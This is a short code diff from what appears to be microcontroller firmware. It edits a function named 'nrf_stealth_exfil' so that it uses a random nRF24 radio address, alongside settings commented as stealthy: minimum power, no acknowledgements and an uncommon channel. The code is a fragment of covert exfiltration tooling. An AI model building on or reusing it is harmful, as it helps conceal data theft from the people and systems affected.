@@ -24,7 +24,8 @@ void nrf_stealth_exfil() {
     if (CHECK_NRF_SPI(mode)) {
         NRFradio.setAutoAck(false);
         NRFradio.setPALevel(RF24_PA_MIN); // Stealthy
-        uint8_t mac[5] = {0xDE, 0xAD, 0xBE, 0xEF, 0x11};
+        uint8_t mac[5];
+        for (int i = 0; i < 5; i++) mac[i] = random(0, 256);
         NRFradio.openWritingPipe(mac);
         NRFradio.setChannel(120); // uncommon high channel
     }
